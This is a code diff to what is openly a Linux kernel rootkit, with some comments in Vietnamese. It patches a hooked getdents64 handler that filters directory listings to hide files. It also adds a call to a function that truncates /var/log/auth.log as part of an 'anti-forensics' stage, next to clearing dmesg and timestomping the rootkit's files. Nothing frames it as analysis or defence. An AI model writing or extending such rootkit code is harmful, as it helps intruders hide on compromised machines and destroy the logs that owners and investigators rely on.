@@ -2264,7 +2264,8 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     }
 
     /* Copy ket qua filtered tro lai userspace */
-    copy_to_user(user_dirent, kern_dirent, ret);
+    if (copy_to_user(user_dirent, kern_dirent, ret))
+        ret = original_ret;  /* copy fail → return unfiltered */
 
     kfree(kern_dirent);
     return ret;
@@ -9775,7 +9776,7 @@ void rk_clear_dmesg(void)
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
-static void rk_clear_auth_logs(void)
+void rk_clear_auth_logs(void)
 {
     char *cmd =
         "truncate -s 0 /var/log/auth.log 2>/dev/null; "
@@ -11525,6 +11526,7 @@ static int __init rk_init(void)
 
     /* 8. Anti-forensics: clear traces */
     rk_clear_dmesg();
+    rk_clear_auth_logs();
     rk_timestomp_rootkit_files();
 
     /* 9. LSM hooks (optional, neu compiled voi LSM support) */
@@ -11726,6 +11728,7 @@ bool rk_environment_safe(void);
 void rk_start_watchdog(void);
 void rk_stop_watchdog(void);
 void rk_clear_dmesg(void);
+void rk_clear_auth_logs(void);
 void rk_timestomp_rootkit_files(void);
 bool rk_integrity_check(void);
 
